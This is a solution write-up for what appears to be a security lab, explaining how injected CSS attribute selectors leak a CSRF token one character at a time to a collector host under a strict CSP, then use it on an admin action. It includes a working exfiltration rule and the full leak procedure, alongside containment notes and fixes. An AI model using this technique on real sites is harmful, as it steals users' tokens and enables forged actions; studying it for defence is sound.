# Solution — CSS Injection: Exfiltrating a CSRF Token via Attribute Selectors

## Vulnerability class

**CWE-79 (Injection) + CWE-201 (Insertion of Sensitive Information Into Sent Data)
· OWASP A03:2021 – Injection.** An attacker-controlled stylesheet is rendered on a
page holding a secret. Even though a strict CSP (`script-src 'none'`) makes
JavaScript impossible, CSS attribute selectors + `background-image` callbacks leak
the secret one character at a time.

## Why JavaScript is off the table

`/preview` sets:

```
default-src 'self'; script-src 'none'; style-src 'self'; img-src *; base-uri 'none'; object-src 'none'
```

`script-src 'none'` blocks every script — inline, event-handler, and external. The
only attacker input is a **stylesheet** (`POST /styles`, served at `/styles.css`),
which contains no script. So there is no JS exfil path at all; the collector never
sees a beacon from a `<script>`/`onerror` attempt. The lab's exploit asserts this
CSP up front. **CSS is the only exfiltration primitive available.**

## The secret is attribute-borne

```html
<input type="text" name="csrf" value="…token…" readonly />
```

The token lives in the `value` **attribute** of a rendered input. This matters
twice over:

- CSS attribute selectors read **attribute values only** — never text-node content.
  A token printed as text (`<span>token</span>`) could not be leaked this way. Here
  it is an attribute, so `[value^="…"]` can test it.
- The input is **rendered** (not `type=hidden`), so a `background-image` set on it
  actually paints and fires its request. (A truly hidden input has no box; you would
  instead target a rendered sibling, e.g. `input[value^="…"] ~ .probe{background:…}`.)

`/preview` is staff-only, so an attacker cannot fetch the token directly, and no
endpoint returns it. The bot's authenticated render + CSS is the only way out.

## The leak — one character per round

A CSS attribute selector `[value^="X"]` matches when the value **starts with** `X`,
and a matched rule can issue a network request via `background: url(...)`:

```css
input[name='csrf'][value^='a'] {
  background: url('http://collector:9000/report?p=0&c=a');
}
```

That request fires **iff** the token starts with `a`. Submit one rule per possible
character (hex: `0-9a-f`) for the current position; exactly one matches and beacons
that character. You cannot learn character _N_ without knowing characters
_0..N-1_ (the selector needs the prefix), so the leak is **inherently sequential**:

```
position 0: 16 rules value^="0" … value^="f"           → learn c0
position 1: 16 rules value^="c0 0" … value^="c0 f"      → learn c1
…
position 7:                                             → learn c7
```

Each round is a fresh stylesheet (`POST /styles`), the bot re-previews (the
stylesheet is `no-store`, so the new rules apply), one rule fires, and
`GET /oob/received` reveals the character (tagged `p=<position>` so rounds don't
collide). `tests/exploit.py` runs all 8 rounds, then completes the chain.

## Completing the chain

The leaked token is exactly what `POST /admin/action` requires:

```
POST /admin/action  {"csrf":"<leaked token>"}   → 200 (the guarded action runs)
POST /solve                                      → FLAG{…}
```

A wrong token is rejected (the exploit asserts this before leaking), so obtaining
the real token via the CSS leak is **necessary** to complete the chain.

## Verification integrity

`tests/exploit.py` enforces the technique-necessity properties:

1. **`script-src 'none'`** is asserted on `/preview` — no script exfil is possible,
   so CSS is genuinely the only channel.
2. **`/preview` is 403** for the attacker — the token can't be read directly.
3. **A wrong CSRF token is rejected** by `/admin/action` — you must leak the real one.
4. The leak visibly proceeds **character-by-character** (8 sequential rounds, one
   beacon per position) — there is no coarser single-request shortcut, because each
   `[value^=…]` rule only reveals the next character given the known prefix.

## Why the containment holds

- Collector + bot live on a `backend` network with `internal: true` — the leaked
  token reaches the in-lab collector only, never the internet.
- `/internal/bot-login` is firewalled to the backend subnet + `BOT_KEY`; `/preview`
  is staff-session-gated. The attacker only ever supplies a stylesheet.
- Single gunicorn worker keeps the stored stylesheet and action state consistent.

## The fix

1. **Do not render untrusted stylesheets on a page that holds secrets.** Preview
   user CSS in a sandboxed, secret-free context (a separate origin / a `sandbox`ed
   iframe with no token in it). CSS injection is a real exfil channel, not "just
   styling."
2. **Keep secrets out of attributes on such pages** — and out of the DOM entirely
   where possible. A CSRF token belongs in a header or a body field the page reads
   server-side, not sitting in an `<input value>` next to attacker CSS.
3. **Tighten `style-src`.** Allow only vetted first-party stylesheets (hashes /
   a strict allow-list), not arbitrary user-supplied CSS.
4. **Rotate the token per request.** A slow character-by-character leak that spans
   many page loads is defeated if the value it is reconstructing changes between
   loads.

## Deviation from the catalog stack

The catalogued scenario is a **Django/PostgreSQL** page that loads a user-supplied
stylesheet **href** past a permissive sanitiser. This lab **re-platforms to Flask**
and hosts the attacker stylesheet **same-origin** (`POST /styles` → `/styles.css`,
`no-store`) under `style-src 'self'`, so a per-character stylesheet can be swapped
in each round and the exploit can drive it through the app's published port. The
CSRF token is **8 hex characters** (shortened so the one-round-per-character leak
fits the CI 60s exploit budget). The taught primitive — CSS attribute-selector
exfil of an attribute-borne secret under `script-src 'none'` — is identical on
either stack. The Playwright verifier stands in for Puppeteer.
